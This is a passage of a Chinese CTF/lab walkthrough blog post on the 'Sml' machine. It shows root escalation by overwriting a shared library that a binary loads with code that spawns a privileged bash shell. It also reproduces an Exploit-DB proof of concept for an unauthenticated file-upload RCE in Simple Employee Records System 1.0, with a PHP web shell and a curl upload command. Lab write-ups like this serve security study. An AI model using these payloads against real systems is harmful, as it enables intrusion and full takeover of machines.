+<h2 id="2、重新构造库文件"><a href="#2、重新构造库文件" class="headerlink" title="2、重新构造库文件"></a>2、重新构造库文件</h2><p>用户<code>yulian</code>的<code>/home</code>目录下面找到一个文件<code>get_root</code>，尝试去运行，发现输出<code>hello world</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@sML:/home/yulian$ ./get_root<br>Starting get_root program...<br>hello world<br></code></pre></td></tr></table></figure>
+
+<p>查看文件加载的库，发现加载了<code>/usr/lib/sML/libxxoo.so</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ ldd get_root <br>        linux-vdso.so.1 (0x00007ffd20857000)<br>        libxxoo.so =&gt; /usr/lib/sML/libxxoo.so (0x00007fe9c25be000)<br>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe9c23e1000)<br>        /lib64/ld-linux-x86-64.so.2 (0x00007fe9c25ca000)<br></code></pre></td></tr></table></figure>
+
+<p>查看库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ strings /usr/lib/sML/libxxoo.so<br>__gmon_start__<br>_ITM_deregisterTMCloneTable<br>_ITM_registerTMCloneTable<br>__cxa_finalize<br>hello<br>puts<br>libc.so.6<br>GLIBC_2.2.5<br>u/UH<br>hello world<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.0</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">xxoo.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">_fini</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">_init</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">puts@GLIBC_2.2.5</span><br><span class="hljs-string">hello</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">__cxa_finalize@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br></code></pre></td></tr></table></figure>
+
+<p>重写一个库，覆盖<code>/usr/lib/sML/libxxoo.so</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ vi xxoo.c<br>yulian@sML:~$ <span class="hljs-built_in">cat</span> xxoo.c <br><span class="hljs-comment">#include&lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;unistd.h&gt;</span><br><br><br><br>void <span class="hljs-function"><span class="hljs-title">hello</span></span>()&#123;<br>        setuid(0);<br>        setgid(0);<br>        system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译<code>xxoo.c</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ gcc -shared -fPIC -o malicious.so xxoo.c<br></code></pre></td></tr></table></figure>
+
+<p>将编译后的文件重定向至<code>/usr/lib/sML/libxxoo.so</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ <span class="hljs-built_in">cat</span> malicious.so &gt; /usr/lib/sML/libxxoo.so<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a>2、获取ROOT权限</h2><p>直接运行<code>get_root</code>即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ ./get_root<br>Starting get_root program...<br>root@sML:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(yulian)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@sML:/root# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-4c850c5b3b2756e67a91bad8e046ddac&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、employee-records-system漏洞"><a href="#1、employee-records-system漏洞" class="headerlink" title="1、employee_records_system漏洞"></a>1、employee_records_system漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49596">https://www.exploit-db.com/exploits/49596</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Exploit Title: Simple Employee Records System 1.0 - File Upload RCE (Unauthenticated)</span><br><span class="hljs-comment"># Date: 2021-02-25</span><br><span class="hljs-comment"># Exploit Author: sml@lacashita.com</span><br><span class="hljs-comment"># Vendor Homepage: https://www.sourcecodester.com/php/11393/employee-records-system.html</span><br><span class="hljs-comment"># Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip</span><br><span class="hljs-comment"># Version: v1.0</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04.2</span><br><br>uploadID.php can be used to upload .php files to <br><span class="hljs-string">&#x27;/uploads/employees_ids/&#x27;</span> without authentication.<br><br>POC<br>---<br><br>1) Make the following Request changing the <span class="hljs-string">&quot;Host:&quot;</span> to your Victim IP.<br><br>POST /dashboard/uploadID.php HTTP/1.1<br>Host: 192.168.1.117<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 <br>Firefox/78.0<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; <br>boundary=---------------------------5825462663702204104870787337<br>Content-Length: 267<br>DNT: 1<br>Connection: close<br><br>-----------------------------5825462663702204104870787337<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;employee_ID&quot;</span>; filename=<span class="hljs-string">&quot;cmd2.php&quot;</span><br>Content-Type: image/png<br>&lt;?php<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>system(<span class="hljs-variable">$cmd</span>);<br>?&gt;<br>-----------------------------5825462663702204104870787337--<br><br><br>2) You will get the response with the name of the uploaded file <br>(upload_filename).<br><br>HTTP/1.1 200 OK<br>Server: nginx/1.18.0 (Ubuntu)<br>Date: Thu, 25 Feb 2021 19:17:55 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Content-Length: 77<br>&#123;<span class="hljs-string">&quot;upload_filename&quot;</span>:<span class="hljs-string">&quot;Ag1rzKFWTlnCZhL_cmd2.php&quot;</span>,<span class="hljs-string">&quot;selected_filename&quot;</span>:<span class="hljs-string">&quot;cmd2.php&quot;</span>&#125;<br><br>3) Your file will be located <span class="hljs-keyword">in</span>: <br>http://VICTIM_IP/uploads/employees_ids/Ag1rzKFWTlnCZhL_cmd2.php<br><br>4) In this example, to run commands:<br>http://192.168.1.117/uploads/employees_ids/Ag1rzKFWTlnCZhL_cmd2.php?cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p>或者使用<code>curl</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.2.52/dashboard/uploadID.php -X POST -F <span class="hljs-string">&#x27;employee_ID=@rev.php;filename=rev.php&#x27;</span> <br></code></pre></td></tr></table></figure>
+
+<h2 id="2、重写库提权"><a href="#2、重写库提权" class="headerlink" title="2、重写库提权"></a>2、重写库提权</h2><p>查看文件引用的库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd &lt;文件名&gt;<br></code></pre></td></tr></table></figure>
+
+<p>编译文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -o &lt;编译好的库名.so&gt; &lt;需要编译的文件.c&gt;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/employee-records-system/" class="print-no-link">#employee_records_system</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-%E5%BA%93%E6%96%87%E4%BB%B6/" class="print-no-link">#提权-库文件</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Sml</div>
+      <div>http://miao-sec.github.io/Maze-sec/Sml/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Backdoor1/" title="Backdoor1">
+                        <span class="hidden-mobile">Backdoor1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
